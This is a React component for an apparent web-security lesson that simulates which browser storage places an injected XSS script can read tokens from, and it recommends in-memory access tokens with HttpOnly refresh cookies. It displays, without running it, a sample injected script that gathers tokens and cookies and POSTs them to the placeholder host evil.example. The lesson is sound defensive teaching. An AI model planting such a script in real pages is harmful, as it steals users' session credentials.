"use client";

import { useEffect, useRef, useState } from "react";
import { useProgress } from "@/components/game/ProgressProvider";
import { useSender } from "@/components/lesson/useSender";
import { Button } from "@/components/ui/button";

const REF = "m2-l4/xss-storage";
const TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ…";

type Store = { id: string; name: string; where: string; script: string; leaks: boolean; why: string };

const STORES: Store[] = [
  { id: "ls", name: "localStorage", where: "Access token saved with localStorage.setItem", script: 'localStorage.getItem("access_token")', leaks: true, why: "Any script on the origin can read it, and it survives reloads and tabs." },
  { id: "ss", name: "sessionStorage", where: "Access token saved with sessionStorage.setItem", script: 'sessionStorage.getItem("access_token")', leaks: true, why: "Just as readable, only scoped to a single tab." },
  { id: "global", name: "JS global variable", where: "Access token in window.accessToken", script: "window.accessToken", leaks: true, why: "A global is just a property of window. Anyone can read it." },
  { id: "closure", name: "In-memory closure variable", where: "Access token in a variable inside the app's own module", script: "window.accessToken", leaks: false, why: "Nothing on window or in storage points at it. It is gone on reload, which the refresh cookie repairs." },
  { id: "cookie", name: "HttpOnly cookie", where: "Refresh token in Set-Cookie: rt=…; HttpOnly", script: "document.cookie", leaks: false, why: "The browser keeps HttpOnly cookies out of document.cookie. The script sees an empty string." },
];

/** A simulated page with five places a token could live, and an "XSS script" that tries to read each. No network. */
export function StorageSim() {
  const [ran, setRan] = useState(false);
  const [used, setUsed] = useState(false);
  const { isDone } = useProgress();
  const sent = useRef(false);
  const { fire, busy, awaitingLogin, openReauth } = useSender((o) => {
    if (!o.ok) sent.current = false;
  });

  useEffect(() => {
    if (!ran || sent.current || isDone(REF)) return;
    sent.current = true;
    void fire({ kind: "attack", ref: REF });
  }, [ran, isDone, fire]);

  return (
    <div className="max-w-3xl space-y-4 rounded-lg border p-4">
      <div className="space-y-1">
        <h3 className="text-sm font-semibold">XSS storage simulator</h3>
        <p className="text-xs text-muted-foreground">
          An attacker got this script into the page. It runs with the page&apos;s own privileges. Nothing here touches a network.
        </p>
      </div>

      <pre className="overflow-x-auto rounded-md border bg-muted/30 p-3 font-mono text-[11px] leading-5">{`<script>
  // injected through a comment field
  const loot = [
    localStorage.getItem("access_token"),
    sessionStorage.getItem("access_token"),
    window.accessToken,
    document.cookie,
  ];
  fetch("https://evil.example/steal", { method: "POST", body: JSON.stringify(loot) });
</script>`}</pre>

      <div className="overflow-x-auto rounded-lg border">
        <table className="w-full text-left text-sm">
          <thead>
            <tr className="text-xs text-muted-foreground">
              <th className="px-3 py-2 font-medium">Where the token lives</th>
              <th className="px-3 py-2 font-medium">The script reads</th>
              <th className="px-3 py-2 font-medium">Result</th>
            </tr>
          </thead>
          <tbody>
            {STORES.map((s) => (
              <tr key={s.id} className="border-t align-top">
                <td className="px-3 py-2">
                  <p className="font-medium">{s.name}</p>
                  <p className="text-xs text-muted-foreground">{s.where}</p>
                </td>
                <td className="px-3 py-2 font-mono text-xs">{s.script}</td>
                <td className="px-3 py-2">
                  {!ran ? (
                    <span className="text-xs text-muted-foreground">not run yet</span>
                  ) : (
                    <div className="space-y-1">
                      <span className={`font-semibold ${s.leaks ? "text-destructive" : "text-success"}`}>{s.leaks ? "leaked" : "not readable"}</span>
                      <p className="font-mono text-[11px] break-all">{s.leaks ? TOKEN : s.id === "cookie" ? '"" (empty)' : "undefined"}</p>
                      <p className="text-xs text-muted-foreground">{s.why}</p>
                    </div>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="flex flex-wrap gap-2">
        <Button variant="outline" size="sm" onClick={() => setRan(true)}>
          Run XSS script
        </Button>
        {ran && (
          <Button variant="outline" size="sm" onClick={() => setUsed(true)}>
            Call the API from the page
          </Button>
        )}
      </div>

      {ran && (
        <p className="max-w-[68ch] text-sm">
          <strong className="font-semibold">Recommended pattern:</strong> keep the access token in memory and the refresh token in an HttpOnly cookie, as Lab 02 does. The script cannot copy either one out to the attacker&apos;s server.
        </p>
      )}

      {used && (
        <div role="status" className="max-w-[68ch] space-y-1 rounded-md border border-warning/40 bg-warning/10 p-3 text-sm">
          <p>
            <strong className="font-semibold">The script can still use the session while the page is open.</strong> It can call <code className="font-mono text-xs">fetch(&quot;/refresh&quot;)</code>: the browser attaches the HttpOnly cookie on its own, and the script receives a fresh access token.
          </p>
          <p>It cannot take the refresh token away, so the damage ends when the tab closes or you revoke the session. XSS is still an emergency. Storage choices only limit how long it lasts.</p>
        </div>
      )}

      {awaitingLogin && (
        <div className="flex items-center gap-2">
          <p role="status" className="text-sm text-muted-foreground">Sign in again to save your progress.</p>
          <Button variant="outline" size="sm" disabled={busy} onClick={openReauth}>Sign in again</Button>
        </div>
      )}
    </div>
  );
}
